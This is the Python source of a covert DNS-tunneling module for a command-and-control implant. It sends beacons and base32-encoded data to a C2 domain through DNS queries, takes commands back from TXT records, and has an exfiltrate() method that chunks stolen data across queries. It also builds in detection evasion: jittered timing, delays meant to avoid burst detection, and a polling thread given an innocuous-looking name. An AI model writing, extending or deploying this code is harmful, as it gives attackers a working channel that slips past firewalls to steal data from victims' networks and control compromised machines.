"""
DNS tunneling — covert data channel over DNS queries.

Encodes data in DNS subdomain labels and receives commands in DNS TXT
responses. Works through most firewalls since DNS (port 53) is almost
always allowed.

Protocol:
  - Agent → Controller: data encoded in subdomain labels
    ``<base32-chunk>.<session-id>.c2.example.com``
  - Controller → Agent: commands returned as DNS TXT records

Encoding options:
  - Base32 (default, safe for DNS labels, ~5 bits per char)
  - Base16 (hex, 4 bits per char, maximum compatibility)

DNS label constraints:
  - Max 63 bytes per label
  - Max 253 bytes total domain name
  - Case-insensitive (use base32, not base64)

Usage::

    from c2.dns_tunnel import DNSTunnel

    tunnel = DNSTunnel(config={
        "domain": "c2.example.com",
        "nameserver": "8.8.8.8",
    })
    tunnel.send_beacon(agent_id="agent-1")
    command = tunnel.poll_commands()
    tunnel.exfiltrate(data=b"sensitive data here")
"""
from __future__ import annotations

import base64
import hashlib
import logging
import os
import random
import socket
import struct
import time
import threading
from typing import Any

from c2.protocol import C2Protocol, C2Message, MessageType

logger = logging.getLogger(__name__)

# DNS constants
_DNS_PORT = 53
_MAX_LABEL_LENGTH = 63
_MAX_DOMAIN_LENGTH = 253
_QUERY_TYPE_TXT = 16
_QUERY_TYPE_A = 1
_QUERY_CLASS_IN = 1


def _base32_encode(data: bytes) -> str:
    """Base32 encode data for safe DNS label use (lowercase, no padding)."""
    return base64.b32encode(data).decode("ascii").lower().rstrip("=")


def _base32_decode(s: str) -> bytes:
    """Decode base32 DNS label data."""
    # Add padding back
    s = s.upper()
    padding = (8 - len(s) % 8) % 8
    s += "=" * padding
    return base64.b32decode(s)


def _build_dns_query(domain: str, qtype: int = _QUERY_TYPE_TXT) -> bytes:
    """Build a raw DNS query packet."""
    # Transaction ID
    txn_id = struct.pack("!H", random.randint(0, 65535))

    # Flags: standard query, recursion desired
    flags = struct.pack("!H", 0x0100)

    # Questions: 1, Answers: 0, Authority: 0, Additional: 0
    counts = struct.pack("!HHHH", 1, 0, 0, 0)

    # Encode domain name
    qname = b""
    for label in domain.split("."):
        encoded = label.encode("ascii")
        if len(encoded) > _MAX_LABEL_LENGTH:
            logger.warning(
                "DNS label exceeds %d bytes (%d), query may be malformed: %.20s...",
                _MAX_LABEL_LENGTH, len(encoded), label,
            )
            encoded = encoded[:_MAX_LABEL_LENGTH]
        qname += struct.pack("!B", len(encoded)) + encoded
    qname += b"\x00"  # root label

    # Question: QNAME + QTYPE + QCLASS
    question = qname + struct.pack("!HH", qtype, _QUERY_CLASS_IN)

    return txn_id + flags + counts + question


def _parse_dns_response(data: bytes) -> list[str]:
    """Parse DNS response and extract TXT record values."""
    txt_records: list[str] = []

    try:
        if len(data) < 12:
            return txt_records

        # Parse header
        ans_count = struct.unpack("!H", data[6:8])[0]
        if ans_count == 0:
            return txt_records

        # Skip question section
        offset = 12
        # Skip QNAME
        while offset < len(data) and data[offset] != 0:
            if data[offset] & 0xC0 == 0xC0:
                offset += 2
                break
            offset += data[offset] + 1
        else:
            offset += 1
        # Skip QTYPE and QCLASS
        offset += 4

        # Parse answer section
        for _ in range(ans_count):
            if offset >= len(data):
                break

            # Skip NAME (may be compressed)
            if data[offset] & 0xC0 == 0xC0:
                offset += 2
            else:
                while offset < len(data) and data[offset] != 0:
                    offset += data[offset] + 1
                offset += 1

            if offset + 10 > len(data):
                break

            rtype = struct.unpack("!H", data[offset:offset + 2])[0]
            rdlength = struct.unpack("!H", data[offset + 8:offset + 10])[0]
            offset += 10

            if rtype == _QUERY_TYPE_TXT and offset + rdlength <= len(data):
                # TXT record: first byte is length of text
                rdata = data[offset:offset + rdlength]
                txt_offset = 0
                while txt_offset < len(rdata):
                    txt_len = rdata[txt_offset]
                    txt_offset += 1
                    if txt_offset + txt_len <= len(rdata):
                        txt_records.append(
                            rdata[txt_offset:txt_offset + txt_len].decode("utf-8", errors="replace")
                        )
                    txt_offset += txt_len

            offset += rdlength

    except Exception as exc:
        logger.debug("DNS response parse error: %s", exc)

    return txt_records


class DNSTunnel:
    """Covert DNS tunnel for C2 communication.

    Parameters
    ----------
    config : dict
        Configuration with keys:
        - ``domain``: C2 domain suffix (e.g., "c2.example.com")
        - ``nameserver``: DNS resolver to use (default: system resolver)
        - ``shared_key``: 32-byte key for message encryption (hex string)
        - ``poll_interval``: seconds between command polls (default: 60)
        - ``jitter``: timing jitter factor (default: 0.3)
    """

    def __init__(self, config: dict[str, Any] | None = None) -> None:
        cfg = config or {}
        self._domain: str = str(cfg.get("domain", "c2.example.com"))
        self._nameserver: str = str(cfg.get("nameserver", ""))
        self._poll_interval: float = float(cfg.get("poll_interval", 60))
        self._jitter: float = float(cfg.get("jitter", 0.3))

        key_hex = str(cfg.get("shared_key", ""))
        shared_key = bytes.fromhex(key_hex) if key_hex else None
        self._protocol = C2Protocol(shared_key=shared_key)

        self._session_id = hashlib.sha256(os.urandom(16)).hexdigest()[:8]
        self._agent_id: str = str(cfg.get("agent_id", ""))
        self._poll_thread: threading.Thread | None = None
        self._stop_event = threading.Event()
        self._command_queue: list[C2Message] = []
        self._lock = threading.Lock()

    # ── Public API ───────────────────────────────────────────────────

    def send_beacon(self) -> bool:
        """Send a beacon/heartbeat to the C2 controller via DNS."""
        msg = C2Message(
            msg_type=MessageType.BEACON,
            agent_id=self._agent_id,
            payload={"status": "active", "ts": time.time()},
        )
        return self._send_message(msg)

    def send_response(self, command_id: str, result: dict[str, Any]) -> bool:
        """Send a command response back to the controller."""
        msg = C2Message(
            msg_type=MessageType.RESPONSE,
            agent_id=self._agent_id,
            payload={"command_id": command_id, "result": result},
        )
        return self._send_message(msg)

    def exfiltrate(self, data: bytes, data_type: str = "generic") -> bool:
        """Exfiltrate data by encoding it in DNS queries.

        Large data is automatically chunked across multiple queries.
        """
        encoded = self._protocol.encode(C2Message(
            msg_type=MessageType.EXFIL,
            agent_id=self._agent_id,
            payload={"type": data_type, "data": base64.b64encode(data).decode()},
        ))

        # Compute max raw bytes per query from actual domain overhead.
        # Full domain: "{subdomain}.{i}.{total}.{session_id}.{domain}"
        # Use 4-digit upper bound for chunk index and total count.
        suffix_overhead = (
            1 + 4           # ".{i}"   — dot + up to 4 digits
            + 1 + 4         # ".{total}"
            + 1 + len(self._session_id)
            + 1 + len(self._domain)
        )
        max_subdomain_len = _MAX_DOMAIN_LENGTH - suffix_overhead
        if max_subdomain_len < 10:
            logger.debug("DNS domain too long for exfil: overhead=%d", suffix_overhead)
            return False

        # Subdomain = base32 chars split into 60-char labels joined by dots.
        # Length = n_b32 + (ceil(n_b32/60) - 1) dots.
        # Solving: n_b32 + ceil(n_b32/60) - 1 <= max_subdomain_len
        #   ⇒ n_b32 <= (max_subdomain_len + 1) * 60 / 61  (conservative)
        max_b32_chars = int((max_subdomain_len + 1) * 60 / 61)
        # Base32: 5 raw bytes → 8 encoded chars
        max_data_per_query = max(1, (max_b32_chars * 5) // 8)

        chunks = C2Protocol.chunk_data(encoded, max_data_per_query)

        for i, chunk in enumerate(chunks):
            chunk_encoded = _base32_encode(chunk)
            # Split into labels of max 63 chars
            labels = [chunk_encoded[j:j + 60] for j in range(0, len(chunk_encoded), 60)]
            subdomain = ".".join(labels)
            domain = f"{subdomain}.{i}.{len(chunks)}.{self._session_id}.{self._domain}"

            if len(domain) > _MAX_DOMAIN_LENGTH:
                logger.debug("DNS exfil domain too long: %d bytes", len(domain))
                return False

            if not self._send_dns_query(domain):
                return False

            # Small delay between chunks to avoid burst detection
            time.sleep(random.uniform(0.1, 0.5))

        return True

    def poll_commands(self) -> list[C2Message]:
        """Poll the C2 controller for pending commands via DNS TXT queries.

        The controller encodes commands in TXT records for the agent's
        polling domain: ``<agent_id>.<session_id>.cmd.<domain>``
        """
        poll_domain = f"{self._agent_id}.{self._session_id}.cmd.{self._domain}"

        try:
            txt_records = self._query_txt(poll_domain)
            commands: list[C2Message] = []

            for txt in txt_records:
                msg = self._protocol.decode(txt.encode("utf-8"))
                if msg and msg.msg_type == MessageType.COMMAND:
                    commands.append(msg)

            return commands

        except Exception as exc:
            logger.debug("DNS command poll failed: %s", exc)
            return []

    def start_polling(self) -> None:
        """Start background thread that polls for commands."""
        if self._poll_thread is not None:
            return
        self._stop_event.clear()
        self._poll_thread = threading.Thread(
            target=self._poll_loop,
            name="NetIO-0",  # innocuous thread name
            daemon=True,
        )
        self._poll_thread.start()

    def stop(self) -> None:
        self._stop_event.set()
        if self._poll_thread and self._poll_thread.is_alive():
            self._poll_thread.join(timeout=10)
        self._poll_thread = None

    def get_pending_commands(self) -> list[C2Message]:
        with self._lock:
            cmds = list(self._command_queue)
            self._command_queue.clear()
            return cmds

    def get_status(self) -> dict[str, Any]:
        with self._lock:
            pending = len(self._command_queue)
        return {
            "domain": self._domain,
            "session_id": self._session_id,
            "agent_id": self._agent_id,
            "polling": self._poll_thread is not None and self._poll_thread.is_alive(),
            "pending_commands": pending,
        }

    # ── Internal methods ─────────────────────────────────────────────

    def _send_message(self, msg: C2Message) -> bool:
        """Encode and send a C2 message via DNS query."""
        encoded = self._protocol.encode(msg)
        data_str = _base32_encode(encoded)

        # Build DNS query domain
        labels = [data_str[i:i + 60] for i in range(0, len(data_str), 60)]
        subdomain = ".".join(labels)
        msg_type_char = msg.msg_type.value
        domain = f"{subdomain}.{msg_type_char}.{self._session_id}.{self._domain}"

        if len(domain) > _MAX_DOMAIN_LENGTH:
            # Need to chunk — send multiple queries
            return self._send_chunked(msg)

        return self._send_dns_query(domain)

    def _send_chunked(self, msg: C2Message) -> bool:
        """Send a large message as multiple DNS queries."""
        encoded = self._protocol.encode(msg)
        chunks = C2Protocol.chunk_data(encoded, 120)

        for i, chunk in enumerate(chunks):
            chunk_b32 = _base32_encode(chunk)
            labels = [chunk_b32[j:j + 60] for j in range(0, len(chunk_b32), 60)]
            subdomain = ".".join(labels)
            domain = f"{subdomain}.{i}.{len(chunks)}.{self._session_id}.{self._domain}"

            if len(domain) > _MAX_DOMAIN_LENGTH:
                logger.debug("DNS domain too long even after chunking: %d", len(domain))
                return False

            if not self._send_dns_query(domain):
                return False

            time.sleep(random.uniform(0.05, 0.2))

        return True

    def _send_dns_query(self, domain: str, qtype: int = _QUERY_TYPE_A) -> bool:
        """Send a raw DNS query to the nameserver."""
        sock = None
        try:
            packet = _build_dns_query(domain, qtype)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)

            nameserver = self._nameserver or self._get_system_nameserver()
            sock.sendto(packet, (nameserver, _DNS_PORT))

            # We don't really care about the response for exfil queries
            try:
                sock.recvfrom(4096)
            except socket.timeout:
                pass

            return True

        except Exception as exc:
            logger.debug("DNS query failed for %s: %s", domain, exc)
            return False
        finally:
            if sock is not None:
                sock.close()

    def _query_txt(self, domain: str) -> list[str]:
        """Query DNS TXT records for a domain."""
        sock = None
        try:
            packet = _build_dns_query(domain, _QUERY_TYPE_TXT)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)

            nameserver = self._nameserver or self._get_system_nameserver()
            sock.sendto(packet, (nameserver, _DNS_PORT))

            response, _ = sock.recvfrom(4096)
            return _parse_dns_response(response)

        except Exception as exc:
            logger.debug("DNS TXT query failed for %s: %s", domain, exc)
            return []
        finally:
            if sock is not None:
                sock.close()

    def _poll_loop(self) -> None:
        """Background polling loop for commands."""
        while not self._stop_event.is_set():
            try:
                commands = self.poll_commands()
                if commands:
                    with self._lock:
                        self._command_queue.extend(commands)
            except Exception:
                pass

            # Jittered interval
            sigma = self._poll_interval * self._jitter
            wait = max(10.0, random.gauss(self._poll_interval, sigma))
            self._stop_event.wait(wait)

    @staticmethod
    def _get_system_nameserver() -> str:
        """Get the system's configured DNS nameserver."""
        try:
            # Try /etc/resolv.conf (Linux/macOS)
            with open("/etc/resolv.conf", "r") as f:
                for line in f:
                    if line.strip().startswith("nameserver"):
                        return line.split()[1]
        except Exception:
            pass
        return "8.8.8.8"  # fallback to Google DNS
